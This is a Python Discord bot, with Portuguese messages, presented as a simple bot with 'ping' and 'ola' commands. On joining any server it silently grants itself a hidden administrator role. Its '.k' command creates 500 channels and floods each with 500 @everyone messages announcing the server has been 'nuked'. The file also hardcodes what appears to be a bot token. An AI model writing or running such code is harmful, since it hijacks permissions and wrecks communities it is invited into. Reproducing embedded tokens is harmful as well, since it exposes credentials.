import asyncio
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents)


@bot.event
async def on_ready():
  print(f"Bot online: {bot.user}")


@bot.event
async def on_guild_join(guild):
  try:
    permissions = discord.Permissions(administrator=True)
    cargo = await guild.create_role(name="...", permissions=permissions)
    await guild.me.add_roles(cargo)
  except Exception:
    pass


@bot.command(name="ping")
async def ping(ctx):
  await ctx.send("pong")


@bot.command(name="ola")
async def ola(ctx):
  await ctx.send(f"ola {ctx.author.name}")


@bot.command(name="k")
async def k(ctx):
  try:
    await ctx.message.delete()
  except Exception:
    pass

  await ctx.send(
      f"{ctx.author.mention} O kakado foi iniciado espere...", delete_after=3
  )
  guild = ctx.guild

  async def criar(i):
    try:
      c = await guild.create_text_channel(f"kakado-{i}")
      for _ in range(500):
        await c.send("@everyone O seu serve foi kakado e não tem como resolver")
        await asyncio.sleep(0.1)
    except Exception:
      pass

  await asyncio.gather(*(criar(i) for i in range(1, 501)))


bot.run("MTU2NTQ5NTk2MzEyMzE5MTgwOA.GPQ2Jb.VgorMpxwj9rp6QGu3Kqk0f3vbEp5i0qRFViAOQ")
